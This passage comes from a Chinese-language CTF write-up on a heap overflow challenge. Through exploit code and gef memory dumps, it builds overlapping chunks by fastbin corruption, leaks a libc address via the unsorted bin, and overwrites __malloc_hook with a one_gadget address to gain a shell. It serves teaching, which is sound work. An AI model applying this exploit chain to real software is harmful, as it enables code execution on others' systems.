\u7ed3\u6784\u3002\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 Fill \u6570\u636e\u7684\u64cd\u4f5c\u5b58\u5728\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4f46\u5e76\u6ca1\u6709\u53d1\u73b0 UAF \u6f0f\u6d1e\uff0c\u6240\u4ee5\u8981\u60f3\u6cc4\u9732\u51fa libc \u57fa\u5740\uff0c\u5f97\u5229\u7528 Dump \u64cd\u4f5c\u3002\u53e6\u5916\u5185\u5b58\u5206\u914d\u4f7f\u7528\u4e86 calloc \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0e malloc \u7684\u533a\u522b\u662f\uff0ccalloc \u4f1a\u5c06\u5206\u914d\u7684\u5185\u5b58\u7a7a\u95f4\u6bcf\u4e00\u4f4d\u90fd\u521d\u59cb\u5316\u4e3a 0\uff0c\u6240\u4ee5\u4e5f\u4e0d\u80fd\u901a\u8fc7\u5206\u914d\u548c\u91ca\u653e\u51e0\u4e2a\u5c0f chunk\uff0c\u518d\u5206\u914d\u4e00\u4e2a\u5927 chunk\uff0c\u6765\u6cc4\u9732\u5176\u5185\u5bb9\u3002\n\n\n\u600e\u4e48\u5229\u7528 Dump \u64cd\u4f5c\u5462\uff1f\u5982\u679c\u80fd\u4f7f\u4e24\u4e2a chunk \u76f8\u91cd\u53e0\uff0cFree \u4e00\u4e2a\uff0cDump \u53e6\u4e00\u4e2a\uff0c\u6216\u8bb8\u53ef\u884c\u3002\n\n\nleak libc\n\n\n\u8fd8\u662f\u4e00\u6837\u7684\uff0c\u4e3a\u4e86\u65b9\u4fbf\u8c03\u8bd5\uff0c\u5148\u5173\u6389 ASLR\u3002\u9996\u5148\u5206\u914d 3 \u4e2a fast chunk \u548c 1 \u4e2a small chunk\uff0c\u5176\u5b9e\u586b\u5145\u6570\u636e\u5bf9\u6f0f\u6d1e\u5229\u7528\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff0c\u8fd9\u91cc\u53ea\u662f\u4e3a\u4e86\u65b9\u4fbf\u89c2\u5bdf\uff1a\n\nalloc\n(\n0x10\n)\n\n\nalloc\n(\n0x10\n)\n\n\nalloc\n(\n0x10\n)\n\n\nalloc\n(\n0x10\n)\n\n\nalloc\n(\n0x80\n)\n\n\nfill\n(\n0\n,\n \nA\n*\n16\n)\n\n\nfill\n(\n1\n,\n \nA\n*\n16\n)\n\n\nfill\n(\n2\n,\n \nA\n*\n16\n)\n\n\nfill\n(\n3\n,\n \nA\n*\n16\n)\n\n\nfill\n(\n4\n,\n \nA\n*\n128\n)\n\n\n\n\ngef\u27a4  x/40gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021  \n-- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021  \n-- chunk 1\n0x555555757030: 0x4141414141414141  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021  \n-- chunk 2\n0x555555757050: 0x4141414141414141  0x4141414141414141\n0x555555757060: 0x0000000000000000  0x0000000000000021  \n-- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000091  \n-- chunk 4\n0x555555757090: 0x4141414141414141  0x4141414141414141\n0x5555557570a0: 0x4141414141414141  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000000  0x0000000000020ef1  \n-- top chunk\n0x555555757120: 0x0000000000000000  0x0000000000000000\n0x555555757130: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/20gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010  \n-- idx 0 -\n chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000001  \n-- idx 1 -\n chunk 1\n0xafc966564e0:  0x0000000000000010  0x0000555555757030\n0xafc966564f0:  0x0000000000000001  0x0000000000000010  \n-- idx 2 -\n chunk 2\n0xafc96656500:  0x0000555555757050  0x0000000000000001  \n-- idx 3 -\n chunk 3\n0xafc96656510:  0x0000000000000010  0x0000555555757070\n0xafc96656520:  0x0000000000000001  0x0000000000000080  \n-- idx 4 -\n chunk 4\n0xafc96656530:  0x0000555555757090  0x0000000000000000\n0xafc96656540:  0x0000000000000000  0x0000000000000000\n0xafc96656550:  0x0000000000000000  0x0000000000000000\n\n\n\u53e6\u5916\u6211\u4eec\u770b\u5230\uff0cchunk \u7684\u5e8f\u53f7\u88ab\u5b58\u50a8\u5230\u4e00\u4e2a mmap \u5206\u914d\u51fa\u6765\u7684\u7ed3\u6784\u4f53\u4e2d\uff0c\u5305\u542b\u4e86 chunk \u7684\u5730\u5740\u548c\u5927\u5c0f\u3002\u7a0b\u5e8f\u5c31\u662f\u901a\u8fc7\u8be5\u7ed3\u6784\u4f53\u5bfb\u627e chunk\uff0c\u7136\u540e\u5404\u79cd\u64cd\u4f5c\u7684\u3002\n\n\nfree \u6389\u4e24\u4e2a fast chunk\uff0c\u8fd9\u6837 chunk 2 \u7684 fd \u6307\u9488\u4f1a\u88ab\u6307\u5411 chunk 1\uff1a\n\nfree\n(\n1\n)\n\n\nfree\n(\n2\n)\n\n\n\n\ngef\u27a4  x/2gx \nmain_arena\n0x7ffff7dd1b20 \nmain_arena\n:    0x0000000000000000  0x0000555555757040\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x555555757050, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x555555757030, size=0x20, flags=PREV_INUSE)\ngef\u27a4  x/40gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021  \n-- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021  \n-- chunk 1 [be freed]\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021  \n-- chunk 2 [be freed]  \n-- fast bins\n0x555555757050: 0x0000555555757020  0x4141414141414141      \n-- fd pointer\n0x555555757060: 0x0000000000000000  0x0000000000000021  \n-- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000091  \n-- chunk 4\n0x555555757090: 0x4141414141414141  0x4141414141414141\n0x5555557570a0: 0x4141414141414141  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000000  0x0000000000020ef1\n0x555555757120: 0x0000000000000000  0x0000000000000000\n0x555555757130: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/20gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010  \n-- idx 0 -\n chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000000\n0xafc966564e0:  0x0000000000000000  0x0000000000000000\n0xafc966564f0:  0x0000000000000000  0x0000000000000000\n0xafc96656500:  0x0000000000000000  0x0000000000000001  \n-- idx 3 -\n chunk 3\n0xafc96656510:  0x0000000000000010  0x0000555555757070\n0xafc96656520:  0x0000000000000001  0x0000000000000080  \n-- idx 4 -\n chunk 4\n0xafc96656530:  0x0000555555757090  0x0000000000000000\n0xafc96656540:  0x0000000000000000  0x0000000000000000\n0xafc96656550:  0x0000000000000000  0x0000000000000000\n\n\nfree \u6389\u7684 chunk\uff0c\u5176\u7ed3\u6784\u4f53\u88ab\u6e05\u7a7a\uff0c\u7b49\u5f85\u4e0b\u4e00\u6b21 malloc\uff0c\u5e76\u6dfb\u52a0\u5230\u7a7a\u51fa\u6765\u7684\u5730\u65b9\u3002\n\n\n\u901a\u8fc7\u6ea2\u51fa\u6f0f\u6d1e\u4fee\u6539\u5df2\u88ab\u91ca\u653e\u7684 chunk 2\uff0c\u8ba9 fd \u6307\u9488\u6307\u5411 chunk 4\uff0c\u8fd9\u6837\u5c31\u5c06 small chunk \u52a0\u5165\u5230\u4e86 fastbins \u94fe\u8868\u4e2d\uff0c\u7136\u540e\u8fd8\u9700\u8981\u628a chunk 4 \u7684 0x91 \u6539\u6210 0x21 \u4ee5\u7ed5\u8fc7 fastbins \u5927\u5c0f\u7684\u68c0\u67e5\uff1a\n\npayload\n  \n=\n \nA\n*\n16\n\n\npayload\n \n+=\n \np64\n(\n0\n)\n\n\npayload\n \n+=\n \np64\n(\n0x21\n)\n\n\npayload\n \n+=\n \np64\n(\n0\n)\n\n\npayload\n \n+=\n \nA\n*\n8\n\n\npayload\n \n+=\n \np64\n(\n0\n)\n\n\npayload\n \n+=\n \np64\n(\n0x21\n)\n\n\npayload\n \n+=\n \np8\n(\n0x80\n)\n\n\nfill\n(\n0\n,\n \npayload\n)\n\n\n\npayload\n  \n=\n \nA\n*\n16\n\n\npayload\n \n+=\n \np64\n(\n0\n)\n\n\npayload\n \n+=\n \np64\n(\n0x21\n)\n\n\nfill\n(\n3\n,\n \npayload\n)\n\n\n\n\ngef\u27a4  x/2gx \nmain_arena\n0x7ffff7dd1b20 \nmain_arena\n:    0x0000000000000000  0x0000555555757040\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x555555757050, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x555555757090, size=0x20, flags=PREV_INUSE)  \u2190  [Corrupted chunk at 0x4141414141414151]\ngef\u27a4  x/40gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021  \n-- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021  \n-- chunk 1 [be freed]\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021  \n-- chunk 2 [be freed]  \n-- fast bins\n0x555555757050: 0x0000555555757080  0x4141414141414141      \n-- fd pointer\n0x555555757060: 0x0000000000000000  0x0000000000000021  \n-- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000021  \n-- chunk 4\n0x555555757090: 0x4141414141414141  0x4141414141414141\n0x5555557570a0: 0x4141414141414141  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000000  0x0000000000020ef1\n0x555555757120: 0x0000000000000000  0x0000000000000000\n0x555555757130: 0x0000000000000000  0x0000000000000000\n\n\n\n\u73b0\u5728\u6211\u4eec\u518d\u5206\u914d\u4e24\u4e2a chunk\uff0c\u5b83\u4eec\u90fd\u4f1a\u4ece fastbins \u4e2d\u88ab\u53d6\u51fa\u6765\uff0c\u800c\u4e14 new chunk 2 \u4f1a\u548c\u539f\u6765\u7684 chunk 4 \u8d77\u59cb\u4f4d\u7f6e\u91cd\u53e0\uff0c\u4f46\u524d\u8005\u662f fast chunk\uff0c\u800c\u540e\u8005\u662f small chunk\uff0c\u5373\u4e00\u4e2a\u5927 chunk \u91cc\u5305\u542b\u4e86\u4e00\u4e2a\u5c0f chunk\uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u9700\u8981\u7684\uff1a\n\nalloc\n(\n0x10\n)\n\n\nalloc\n(\n0x10\n)\n\n\nfill\n(\n1\n,\n \nB\n*\n16\n)\n\n\nfill\n(\n2\n,\n \nC\n*\n16\n)\n\n\nfill\n(\n4\n,\n \nD\n*\n16\n)\n\n\n\n\ngef\u27a4  x/2gx \nmain_arena\n0x7ffff7dd1b20 \nmain_arena\n:    0x0000000000000000  0x4141414141414141\ngef\u27a4  x/40gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021  \n-- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021  \n-- chunk 1 [be freed]\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021  \n-- new chunk 1\n0x555555757050: 0x4242424242424242  0x4242424242424242\n0x555555757060: 0x0000000000000000  0x0000000000000021  \n-- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000021  \n-- chunk 4, new chunk 2\n0x555555757090: 0x4444444444444444  0x4444444444444444\n0x5555557570a0: 0x0000000000000000  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000000  0x0000000000020ef1\n0x555555757120: 0x0000000000000000  0x0000000000000000\n0x555555757130: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/20gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010  \n-- idx 0 -\n chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000001  \n-- idx 1 -\n new chunk 1\n0xafc966564e0:  0x0000000000000010  0x0000555555757050\n0xafc966564f0:  0x0000000000000001  0x0000000000000010  \n-- idx 2 -\n new chunk 2\n0xafc96656500:  0x0000555555757090  0x0000000000000001  \n-- idx 3 -\n chunk 3\n0xafc96656510:  0x0000000000000010  0x0000555555757070\n0xafc96656520:  0x0000000000000001  0x0000000000000080  \n-- idx 4 -\n chunk 4\n0xafc96656530:  0x0000555555757090  0x0000000000000000\n0xafc96656540:  0x0000000000000000  0x0000000000000000\n0xafc96656550:  0x0000000000000000  0x0000000000000000\n\n\n\u53ef\u4ee5\u770b\u5230\u65b0\u5206\u914d\u7684 chunk 2\uff0c\u586b\u8865\u5230\u4e86\u88ab\u91ca\u653e\u7684 chunk 2 \u7684\u4f4d\u7f6e\u4e0a\u3002\n\n\n\u518d\u6b21\u5229\u7528\u6ea2\u51fa\u6f0f\u6d1e\u5c06 chunk 4 \u7684 0x21 \u6539\u56de 0x91\uff0c\u7136\u540e\u4e3a\u4e86\u907f\u514d free(4) \u540e\u8be5 chunk \u88ab\u5408\u5e76\u8fdb top chunk\uff0c\u9700\u8981\u518d\u5206\u914d\u4e00\u4e2a small chunk\uff1a\n\npayload\n  \n=\n \nA\n*\n16\n\n\npayload\n \n+=\n \np64\n(\n0\n)\n\n\npayload\n \n+=\n \np64\n(\n0x91\n)\n\n\nfill\n(\n3\n,\n \npayload\n)\n\n\n\nalloc\n(\n0x80\n)\n\n\nfill\n(\n5\n,\n \nA\n*\n128\n)\n\n\n\n\ngef\u27a4  x/60gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021  \n-- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021  \n-- new chunk 1\n0x555555757050: 0x4242424242424242  0x4242424242424242\n0x555555757060: 0x0000000000000000  0x0000000000000021  \n-- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000091  \n-- chunk 4, new chunk 2\n0x555555757090: 0x4444444444444444  0x4444444444444444\n0x5555557570a0: 0x0000000000000000  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000000  0x0000000000000091  \n-- chunk 5\n0x555555757120: 0x4141414141414141  0x4141414141414141\n0x555555757130: 0x4141414141414141  0x4141414141414141\n0x555555757140: 0x4141414141414141  0x4141414141414141\n0x555555757150: 0x4141414141414141  0x4141414141414141\n0x555555757160: 0x4141414141414141  0x4141414141414141\n0x555555757170: 0x4141414141414141  0x4141414141414141\n0x555555757180: 0x4141414141414141  0x4141414141414141\n0x555555757190: 0x4141414141414141  0x4141414141414141\n0x5555557571a0: 0x0000000000000000  0x0000000000020e61  \n-- top chunk\n0x5555557571b0: 0x0000000000000000  0x0000000000000000\n0x5555557571c0: 0x0000000000000000  0x0000000000000000\n0x5555557571d0: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/20gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010  \n-- idx 0 -\n chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000001  \n-- idx 1 -\n new chunk 1\n0xafc966564e0:  0x0000000000000010  0x0000555555757050\n0xafc966564f0:  0x0000000000000001  0x0000000000000010  \n-- idx 2 -\n new chunk 2\n0xafc96656500:  0x0000555555757090  0x0000000000000001  \n-- idx 3 -\n chunk 3\n0xafc96656510:  0x0000000000000010  0x0000555555757070\n0xafc96656520:  0x0000000000000001  0x0000000000000080  \n-- idx 4 -\n chunk 4\n0xafc96656530:  0x0000555555757090  0x0000000000000001  \n-- idx 5 -\n chunk 5\n0xafc96656540:  0x0000000000000080  0x0000555555757120\n0xafc96656550:  0x0000000000000000  0x0000000000000000\n\n\n\n\u8fd9\u65f6\uff0c\u5982\u679c\u6211\u4eec\u5c06 chunk 4 \u91ca\u653e\u6389\uff0c\u5176 fd \u6307\u9488\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u6307\u5411 unsorted bin \u94fe\u8868\u7684\u5934\u90e8\uff0c\u8fd9\u4e2a\u5730\u5740\u5728 libc \u4e2d\uff0c\u4e14\u76f8\u5bf9\u4f4d\u7f6e\u56fa\u5b9a\uff0c\u5229\u7528\u5b83\u5c31\u53ef\u4ee5\u7b97\u51fa libc \u88ab\u52a0\u8f7d\u7684\u5730\u5740\uff1a\n\nfree\n(\n4\n)\n\n\n\n\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena \nmain_arena\n ]\n[+] unsorted_bins[0]: fw=0x555555757080, bk=0x555555757080\n \u2192   Chunk(addr=0x555555757090, size=0x90, flags=PREV_INUSE)\ngef\u27a4  x/60gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021  \n-- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021  \n-- new chunk 1\n0x555555757050: 0x4242424242424242  0x4242424242424242\n0x555555757060: 0x0000000000000000  0x0000000000000021  \n-- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000091  \n-- chunk 4 [be freed], new chunk 2 \n-- unsorted bin\n0x555555757090: 0x00007ffff7dd1b78  0x00007ffff7dd1b78      \n-- fd, bk pointer\n0x5555557570a0: 0x0000000000000000  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000090  0x0000000000000090  \n-- chunk 5\n0x555555757120: 0x4141414141414141  0x4141414141414141\n0x555555757130: 0x4141414141414141  0x4141414141414141\n0x555555757140: 0x4141414141414141  0x4141414141414141\n0x555555757150: 0x4141414141414141  0x4141414141414141\n0x555555757160: 0x4141414141414141  0x4141414141414141\n0x555555757170: 0x4141414141414141  0x4141414141414141\n0x555555757180: 0x4141414141414141  0x4141414141414141\n0x555555757190: 0x4141414141414141  0x4141414141414141\n0x5555557571a0: 0x0000000000000000  0x0000000000020e61\n0x5555557571b0: 0x0000000000000000  0x0000000000000000\n0x5555557571c0: 0x0000000000000000  0x0000000000000000\n0x5555557571d0: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/20gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010  \n-- idx 0 -\n chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000001  \n-- idx 1 -\n new chunk 1\n0xafc966564e0:  0x0000000000000010  0x0000555555757050\n0xafc966564f0:  0x0000000000000001  0x0000000000000010  \n-- idx 2 -\n new chunk 2\n0xafc96656500:  0x0000555555757090  0x0000000000000001  \n-- idx 3 -\n chunk 3\n0xafc96656510:  0x0000000000000010  0x0000555555757070\n0xafc96656520:  0x0000000000000000  0x0000000000000000\n0xafc96656530:  0x0000000000000000  0x0000000000000001  \n-- idx 5 -\n chunk 5\n0xafc96656540:  0x0000000000000080  0x0000555555757120\n0xafc96656550:  0x0000000000000000  0x0000000000000000\n\n\n\n\u6700\u540e\u5229\u7528 Dump \u64cd\u4f5c\u5373\u53ef\u5c06\u5730\u5740\u6cc4\u6f0f\u51fa\u6765\uff1a\n\nleak\n \n=\n \nu64\n(\ndump\n(\n2\n)[:\n8\n])\n\n\nlibc\n \n=\n \nleak\n \n-\n \n0x3c4b78\n          \n# 0x3c4b78 = leak - libc\n\n\n__malloc_hook\n \n=\n \nlibc\n \n-\n \n0x3c4b10\n    \n# readelf -s libc.so.6 | grep __malloc_hook@\n\n\none_gadget\n \n=\n \nlibc\n \n-\n \n0x4526a\n\n\n\n\n[*] leak =\n 0x7ffff7dd1b78\n[*] libc =\n 0x7ffff7a0d000\n[*] __malloc_hook =\n 0x7ffff7dd1b10\n[*] one_gadget =\n 0x7ffff7a5226a\n\n\n\nget shell\n\n\n\u7531\u4e8e\u5f00\u542f\u4e86 Full RELRO\uff0c\u6539\u5199 GOT \u8868\u662f\u4e0d\u884c\u4e86\u3002\u8003\u8651\u7528 \n__malloc_hook\n\uff0c\u5b83\u662f\u4e00\u4e2a\u5f31\u7c7b\u578b\u7684\u51fd\u6570\u6307\u9488\u53d8\u91cf\uff0c\u6307\u5411 \nvoid * function(size_t size, void * caller)\n\uff0c\u5f53\u8c03\u7528 malloc() \u65f6\uff0c\u9996\u5148\u5224\u65ad hook \u51fd\u6570\u6307\u9488\u662f\u5426\u4e3a\u7a7a\uff0c\u4e0d\u4e3a\u7a7a\u5219\u8c03\u7528\u5b83\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u4f20\u5165\u4e00\u4e2a one-gadget \u5373\u53ef\uff08\u8be6\u60c5\u8bf7\u67e5\u770b\u7ae0\u82824.6\uff09\u3002\n\n\n\u9996\u5148\u8003\u8651\u600e\u6837\u5229\u7528 fastbins \u5728 \n__malloc_hook\n \u6307\u5411\u7684\u5730\u5740\u5904\u5199\u5165 one_gadget \u7684\u5730\u5740\u3002\u8fd9\u91cc\u6709\u4e00\u4e2a\u6280\u5de7\uff0c\u5730\u5740\u504f\u79fb\uff0c\u5c31\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\u4e00\u4e2a fake chunk\uff0c\u5176\u5927\u5c0f\u4e3a 0x7f\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a fast chunk\uff1a\n\ngef\u27a4  x/10gx (long long)(\nmain_arena)-0x30\n0x7ffff7dd1af0 \n_IO_wide_data_0+304\n:   0x00007ffff7dd0260  0x0000000000000000\n0x7ffff7dd1b00 \n__memalign_hook\n:   0x00007ffff7a92e20  0x00007ffff7a92a00\n0x7ffff7dd1b10 \n__malloc_hook\n: 0x0000000000000000  0x0000000000000000\n0x7ffff7dd1b20 \nmain_arena\n:    0x0000000000000000  0x4141414141414141  \n-- target\n0x7ffff7dd1b30 \nmain_arena+16\n: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/10gx (long long)(\nmain_arena)-0x30+0xd\n0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f      \n-- fake chunk\n0x7ffff7dd1b0d: 0x000000000000007f  0x0000000000000000\n0x7ffff7dd1b1d: 0x0000000000000000  0x4141414141000000\n0x7ffff7dd1b2d: 0x0000000000414141  0x0000000000000000\n0x7ffff7dd1b3d: 0x0000000000000000  0x0000000000000000\n\n\n\u7528\u672c\u5730\u7684\u6cc4\u9732\u5730\u5740\u51cf\u53bb libc \u5730\u5740\u5f97\u5230\u504f\u79fb\uff1a\n\n[0x00000000]\n ?v 0x7ffff7dd1b78 - 0x7ffff7a0d000\n0x3c4b78\n\n\n\n\u4e4b\u524d free \u6389\u7684 chunk 4 \u4e00\u4e2a small chunk\uff0c\u88ab\u6dfb\u52a0\u5230\u4e86 unsorted bin \u4e2d\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u7684\u662f fast chunk\uff0c\u6240\u4ee5\u8fd9\u91cc\u91c7\u7528\u5206\u914d\u4e00\u4e2a fast chunk\uff0c\u518d\u91ca\u653e\u6389\u7684\u529e\u6cd5\uff0c\u5c06\u5176\u6dfb\u52a0\u5230 fast bins \u4e2d\u3002\u7136\u540e\u6539\u5199\u5b83\u7684 fd \u6307\u9488\u6307\u5411 fake chunk\uff08\u5f53\u7136\u4e5f\u8981\u901a\u8fc7 libc \u504f\u79fb\u8ba1\u7b97\u51fa\u6765\uff09\uff1a\n\nalloc\n(\n0x60\n)\n\n\nfree\n(\n4\n)\n\n\n\npayload\n \n=\n \np64\n(\nlibc\n \n+\n \n0x3c4afd\n)\n\n\nfill\n(\n2\n,\n \npayload\n)\n\n\n\n\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena \nmain_arena\n ]\n[+] unsorted_bins[0]: fw=0x5555557570f0, bk=0x5555557570f0\n \u2192   Chunk(addr=0x555555757100, size=0x20, flags=PREV_INUSE)\ngef\u27a4  x/60gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021  \n-- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021  \n-- new chunk 1\n0x555555757050: 0x4242424242424242  0x4242424242424242\n0x555555757060: 0x0000000000000000  0x0000000000000021  \n-- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000071  \n-- new chunk 2, new chunk 4 [be freed]\n0x555555757090: 0x00007ffff7dd1afd  0x0000000000000000      \n-- fd pointer\n0x5555557570a0: 0x0000000000000000  0x0000000000000000\n0x5555557570b0: 0x0000000000000000  0x0000000000000000\n0x5555557570c0: 0x0000000000000000  0x0000000000000000\n0x5555557570d0: 0x0000000000000000  0x0000000000000000\n0x5555557570e0: 0x0000000000000000  0x0000000000000000\n0x5555557570f0: 0x0000000000000000  0x0000000000000021      \n-- unsorted bin\n0x555555757100: 0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x555555757110: 0x0000000000000020  0x0000000000000090  \n-- chunk 5\n0x555555757120: 0x4141414141414141  0x4141414141414141\n0x555555757130: 0x4141414141414141  0x4141414141414141\n0x555555757140: 0x4141414141414141  0x4141414141414141\n0x555555757150: 0x4141414141414141  0x4141414141414141\n0x555555757160: 0x4141414141414141  0x4141414141414141\n0x555555757170: 0x4141414141414141  0x4141414141414141\n0x555555757180: 0x4141414141414141  0x4141414141414141\n0x555555757190: 0x4141414141414141  0x4141414141414141\n0x5555557571a0: 0x0000000000000000  0x0000000000020e61\n0x5555557571b0: 0x0000000000000000  0x0000000000000000\n0x5555557571c0: 0x0000000000000000  0x0000000000000000\n0x5555557571d0: 0x0000000000000000  0x0000000000000000\n\n\n\n\u8fde\u7eed\u4e24\u6b21\u5206\u914d\uff0c\u7b2c\u4e00\u6b21\u5c06 fake chunk \u6dfb\u52a0\u5230 fast bins\uff0c\u7b2c\u4e8c\u6b21\u5206\u914d fake chunk\uff0c\u5206\u522b\u662f new new chunk 4 \u548c chunk 6\u3002\u7136\u540e\u5c31\u53ef\u4ee5\u6539\u5199 \n__malloc_hook\n \u7684\u5730\u5740\uff0c\u5c06\u5176\u6307\u5411 one-gadget\uff1a\n\nalloc\n(\n0x60\n)\n\n\nalloc\n(\n0x60\n)\n\n\n\npayload\n  \n=\n \np8\n(\n0\n)\n*\n3\n\n\npayload\n \n+=\n \np64\n(\none_gadget\n)\n\n\nfill\n(\n6\n,\n \npayload\n)\n\n\n\n\ngef\u27a4  x/10gx (long long)(\nmain_arena)-0x30\n0x7ffff7dd1af0 \n_IO_wide_data_0+304\n:   0x00007ffff7dd0260  0x0000000000000000\n0x7ffff7dd1b00 \n__memalign_hook\n:   0x00007ffff7a92e20  0x000000fff7a92a00\n0x7ffff7dd1b10 \n__malloc_hook\n: 0x00007ffff7a5226a  0x0000000000000000  \n-- target\n0x7ffff7dd1b20 